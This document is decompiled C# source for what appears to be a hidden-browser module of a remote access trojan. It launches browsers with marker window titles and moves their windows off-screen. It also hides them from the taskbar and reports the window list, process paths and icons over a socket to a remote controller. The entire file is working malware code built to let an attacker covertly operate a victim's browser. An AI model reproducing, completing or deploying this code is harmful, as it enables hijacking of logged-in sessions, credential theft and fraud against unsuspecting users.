using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using HBrowser;

// Token: 0x02000003 RID: 3
public class GetWindowsHidden
{
	// Token: 0x17000001 RID: 1
	// (get) Token: 0x06000004 RID: 4 RVA: 0x000020D0 File Offset: 0x000002D0
	// (set) Token: 0x06000005 RID: 5 RVA: 0x000020D7 File Offset: 0x000002D7
	private static bool IsWindowActived { get; set; }

	// Token: 0x06000006 RID: 6 RVA: 0x000020E0 File Offset: 0x000002E0
	public static void GetListWindow()
	{
		StringBuilder stringBuilder = new StringBuilder();
		bool flag = GetWindowsHidden.ListBrowser.Count <= 0;
		if (!flag)
		{
			try
			{
				int i = GetWindowsHidden.ListBrowser.Count - 1;
				while (i > -1)
				{
					object syncLock = GetWindowsHidden.SyncLock;
					lock (syncLock)
					{
						IntPtr hWnd = GetWindowsHidden.ListBrowser[i];
						bool flag3 = GetWindowsHidden.WindowCheck(hWnd);
						if (flag3)
						{
							int num;
							Native.GetWindowThreadProcessId(hWnd, out num);
							bool flag4 = num == 0;
							if (!flag4)
							{
								string mainModuleFilepath = Native.GetMainModuleFilepath(num);
								bool flag5 = File.Exists(mainModuleFilepath);
								if (flag5)
								{
									Icon original = Icon.ExtractAssociatedIcon(mainModuleFilepath);
									Icon icon = new Icon(original, new Size(24, 24));
									Bitmap bitmap = new Bitmap(icon.ToBitmap(), new Size(24, 24));
									MemoryStream memoryStream = new MemoryStream();
									bitmap.Save(memoryStream, ImageFormat.Png);
									stringBuilder.Append(string.Concat(new string[]
									{
										mainModuleFilepath,
										"-==>",
										i.ToString(),
										"-==>",
										Convert.ToBase64String(memoryStream.ToArray()),
										"-==>",
										num.ToString(),
										"-==>"
									}));
								}
							}
						}
						else
						{
							GetWindowsHidden.ListBrowser.RemoveAt(i);
						}
					}
					IL_15D:
					i += -1;
					continue;
					goto IL_15D;
				}
				ClientSocket.Send(string.Concat(new string[]
				{
					"WindowsActive",
					Settings.SPL,
					Settings.IDD,
					Settings.SPL,
					stringBuilder.ToString()
				}));
				Helper.MsgLogs("Windows list updated successfully");
			}
			catch
			{
				Helper.MsgLogs("An error occurred while importing the list of windows");
			}
		}
	}

	// Token: 0x06000007 RID: 7 RVA: 0x000022E8 File Offset: 0x000004E8
	public static bool InitializingWindow(int IndexWindow, int Width, int Height)
	{
		bool flag = GetWindowsHidden.ListBrowser.Count > 0;
		if (flag)
		{
			try
			{
				Helper.MsgLogs("Initializing window...");
				IntPtr intPtr = GetWindowsHidden.ListBrowser[IndexWindow];
				foreach (IntPtr intPtr2 in GetWindowsHidden.ListBrowser)
				{
					GetWindowsHidden.MoveWindow(intPtr2, 5000, 5000, Width, Height);
				}
				bool flag2 = GetWindowsHidden.WindowCheck(intPtr);
				if (flag2)
				{
					GetWindowsHidden.MoveWindow(intPtr, 10000, 10000, Width, Height);
					GetWindowsHidden.User32.ShowWindow(intPtr, 0);
					GetWindowsHidden.User32.SetWindowLong(intPtr, -20, GetWindowsHidden.User32.GetWindowLong(intPtr, -20) | 128);
					GetWindowsHidden.User32.ShowWindow(intPtr, 5);
					GetWindowsHidden.User32.SetWindowPos(intPtr, (IntPtr)1, 10000, 10000, Width, Height, 64U);
					GetWindowsHidden.IsWindowActived = true;
				}
				else
				{
					GetWindowsHidden.IsWindowActived = false;
				}
			}
			catch
			{
				return false;
			}
		}
		return GetWindowsHidden.IsWindowActived;
	}

	// Token: 0x06000008 RID: 8 RVA: 0x00002410 File Offset: 0x00000610
	public static bool GetHandleBrowser(string Title, int Width, int Height)
	{
		bool result;
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				bool flag = !string.IsNullOrEmpty(process.MainWindowTitle) && process.MainWindowTitle.Contains(Title);
				if (flag)
				{
					IntPtr mainWindowHandle = process.MainWindowHandle;
					GetWindowsHidden.MoveWindow(mainWindowHandle, 10000, 10000, Width, Height);
					GetWindowsHidden.User32.ShowWindow(mainWindowHandle, 0);
					GetWindowsHidden.User32.SetWindowLong(mainWindowHandle, -20, GetWindowsHidden.User32.GetWindowLong(mainWindowHandle, -20) | 128);
					GetWindowsHidden.User32.ShowWindow(mainWindowHandle, 5);
					GetWindowsHidden.User32.SetWindowPos(mainWindowHandle, (IntPtr)1, 10000, 10000, Width, Height, 64U);
					GetWindowsHidden.ListBrowser.Add(mainWindowHandle);
					return true;
				}
			}
			result = false;
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000009 RID: 9 RVA: 0x00002500 File Offset: 0x00000700
	public static string RetrunBrowser(string Browser, string CustomName, string TitleCustomOpen)
	{
		if (!(Browser == "chrome"))
		{
			if (!(Browser == "edge"))
			{
				if (Browser == "firefox")
				{
					goto IL_210;
				}
				if (Browser == "brave")
				{
					goto IL_2F1;
				}
				if (!(Browser == "CustomOpen"))
				{
					goto IL_49D;
				}
				goto IL_3D2;
			}
		}
		else
		{
			string text = "Welcome Chrome Browser";
			try
			{
				int num = 0;
				bool flag = !GetWindowsHidden.ScanWindows(text);
				if (flag)
				{
					Process.Start("chrome", "--new-window \"data:text/html,<title>Welcome Chrome Browser</title>\" --mute-audio --disable-audio");
					while (ClientSocket.isConnected)
					{
						Process[] processes = Process.GetProcesses();
						Process[] array = processes;
						foreach (Process process in array)
						{
							bool flag2 = !string.IsNullOrEmpty(process.MainWindowTitle) && process.MainWindowTitle.Contains(text);
							if (flag2)
							{
								return text;
							}
							bool flag3 = num >= 20;
							if (flag3)
							{
								return null;
							}
						}
						Thread.Sleep(250);
						num++;
					}
					goto IL_49D;
				}
				return text;
			}
			catch
			{
				return null;
			}
		}
		string text2 = "Welcome Edge Browser";
		try
		{
			int num2 = 0;
			bool flag4 = !GetWindowsHidden.ScanWindows(text2);
			if (flag4)
			{
				Process.Start("msedge", "--new-window \"data:text/html,<title>Welcome Edge Browser</title>\" --mute-audio --disable-audio");
				while (ClientSocket.isConnected)
				{
					Process[] processes2 = Process.GetProcesses();
					Process[] array3 = processes2;
					foreach (Process process2 in array3)
					{
						bool flag5 = !string.IsNullOrEmpty(process2.MainWindowTitle) && process2.MainWindowTitle.Contains(text2);
						if (flag5)
						{
							return text2;
						}
						bool flag6 = num2 >= 20;
						if (flag6)
						{
							return null;
						}
					}
					Thread.Sleep(250);
					num2++;
				}
				goto IL_49D;
			}
			return text2;
		}
		catch
		{
			return null;
		}
		IL_210:
		string text3 = "Welcome_firefox_Browser";
		try
		{
			int num3 = 0;
			bool flag7 = !GetWindowsHidden.ScanWindows(text3);
			if (flag7)
			{
				Process.Start("firefox", "--new-window data:text/html,<title>Welcome_firefox_Browser</title>");
				while (ClientSocket.isConnected)
				{
					Process[] processes3 = Process.GetProcesses();
					Process[] array5 = processes3;
					foreach (Process process3 in array5)
					{
						bool flag8 = !string.IsNullOrEmpty(process3.MainWindowTitle) && process3.MainWindowTitle.Contains(text3);
						if (flag8)
						{
							return text3;
						}
						bool flag9 = num3 >= 20;
						if (flag9)
						{
							return null;
						}
					}
					Thread.Sleep(250);
					num3++;
				}
				goto IL_49D;
			}
			return text3;
		}
		catch
		{
			return null;
		}
		IL_2F1:
		string text4 = "Welcome brave Browser";
		try
		{
			int num4 = 0;
			bool flag10 = !GetWindowsHidden.ScanWindows(text4);
			if (flag10)
			{
				Process.Start("brave", "--new-window \"data:text/html,<title>Welcome brave Browser</title>\" --mute-audio --disable-audio");
				while (ClientSocket.isConnected)
				{
					Process[] processes4 = Process.GetProcesses();
					Process[] array7 = processes4;
					foreach (Process process4 in array7)
					{
						bool flag11 = !string.IsNullOrEmpty(process4.MainWindowTitle) && process4.MainWindowTitle.Contains(text4);
						if (flag11)
						{
							return text4;
						}
						bool flag12 = num4 >= 20;
						if (flag12)
						{
							return null;
						}
					}
					Thread.Sleep(250);
					num4++;
				}
				goto IL_49D;
			}
			return text4;
		}
		catch
		{
			return null;
		}
		IL_3D2:
		try
		{
			int num5 = 0;
			bool flag13 = !GetWindowsHidden.ScanWindows(TitleCustomOpen);
			if (!flag13)
			{
				return TitleCustomOpen;
			}
			Process.Start(CustomName, "--new-window \"data:text/html,<title>%Title%</title>\" --mute-audio --disable-audio".Replace("%Title%", TitleCustomOpen));
			while (ClientSocket.isConnected)
			{
				Process[] processes5 = Process.GetProcesses();
				Process[] array9 = processes5;
				foreach (Process process5 in array9)
				{
					bool flag14 = !string.IsNullOrEmpty(process5.MainWindowTitle) && process5.MainWindowTitle.Contains(TitleCustomOpen);
					if (flag14)
					{
						return TitleCustomOpen;
					}
					bool flag15 = num5 >= 20;
					if (flag15)
					{
						return null;
					}
				}
				Thread.Sleep(250);
				num5++;
			}
		}
		catch
		{
			return null;
		}
		IL_49D:
		return null;
	}

	// Token: 0x0600000A RID: 10 RVA: 0x000029F4 File Offset: 0x00000BF4
	public static bool ScanWindows(string Title)
	{
		bool result;
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				bool flag = !string.IsNullOrEmpty(process.MainWindowTitle) && process.MainWindowTitle.Contains(Title);
				if (flag)
				{
					return true;
				}
			}
			result = false;
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600000B RID: 11 RVA: 0x00002A6C File Offset: 0x00000C6C
	public static void MoveWindow(IntPtr intPtr, int LX, int LY, int Width, int Height)
	{
		try
		{
			Native.SetWindowPos(intPtr, IntPtr.Zero, LX, LY, Width, Height, Native.SetWindowPosFlags.DoNotChangeOwnerZOrder | Native.SetWindowPosFlags.IgnoreResize);
		}
		catch
		{
		}
	}

	// Token: 0x0600000C RID: 12 RVA: 0x00002AAC File Offset: 0x00000CAC
	public static void ResizeWondow(IntPtr hWnd, int x, int y)
	{
		try
		{
			GetWindowsHidden.User32.SetWindowPos(hWnd, (IntPtr)1, 10000, 10000, x, y, 64U);
		}
		catch
		{
		}
	}

	// Token: 0x0600000D RID: 13 RVA: 0x00002AF0 File Offset: 0x00000CF0
	public static bool WindowCheck(IntPtr hWnd)
	{
		bool flag = !GetWindowsHidden.User32.IsWindowVisible(hWnd);
		return !flag;
	}

	// Token: 0x0600000E RID: 14 RVA: 0x00002B18 File Offset: 0x00000D18
	public static void WindowClose(IntPtr hWnd, int x, int y)
	{
		try
		{
			GetWindowsHidden.MoveWindow(hWnd, 10000, 10000, x, y);
			GetWindowsHidden.User32.PostMessage(hWnd, 16U, IntPtr.Zero, IntPtr.Zero);
			GetWindowsHidden.GetListWindow();
		}
		catch
		{
		}
	}

	// Token: 0x0600000F RID: 15 RVA: 0x00002B6C File Offset: 0x00000D6C
	public static void ClearList(int x, int y)
	{
		try
		{
			bool flag = GetWindowsHidden.ListBrowser.Count <= 0;
			if (!flag)
			{
				foreach (IntPtr hWnd in GetWindowsHidden.ListBrowser)
				{
					GetWindowsHidden.WindowClose(hWnd, x, y);
				}
				Helper.WindowrActive = IntPtr.Zero;
			}
		}
		catch
		{
		}
	}

	// Token: 0x04000001 RID: 1
	public static List<IntPtr> ListBrowser = new List<IntPtr>();

	// Token: 0x04000002 RID: 2
	private static readonly object SyncLock = new object();

	// Token: 0x0200000E RID: 14
	private class User32
	{
		// Token: 0x06000050 RID: 80
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x06000051 RID: 81
		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowRect(IntPtr hWnd, ref GetWindowsHidden.User32.RECT rect);

		// Token: 0x06000052 RID: 82
		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsWindowVisible(IntPtr hWnd);

		// Token: 0x06000053 RID: 83
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000054 RID: 84
		[DllImport("User32.dll")]
		public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

		// Token: 0x06000055 RID: 85
		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000056 RID: 86
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

		// Token: 0x06000057 RID: 87
		[DllImport("user32.dll")]
		public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

		// Token: 0x06000058 RID: 88
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x0400002A RID: 42
		public const int SW_HIDE = 0;

		// Token: 0x0400002B RID: 43
		public const int SW_SHOW = 5;

		// Token: 0x0400002C RID: 44
		public const int GWL_EXSTYLE = -20;

		// Token: 0x0400002D RID: 45
		public const int WS_EX_TOOLWINDOW = 128;

		// Token: 0x0400002E RID: 46
		public const int CloseHandel = 16;

		// Token: 0x0400002F RID: 47
		public const int IsCloseHandel = 20;

		// Token: 0x02000011 RID: 17
		public struct RECT
		{
			// Token: 0x04000034 RID: 52
			public int left;

			// Token: 0x04000035 RID: 53
			public int top;

			// Token: 0x04000036 RID: 54
			public int right;

			// Token: 0x04000037 RID: 55
			public int bottom;
		}
	}
}
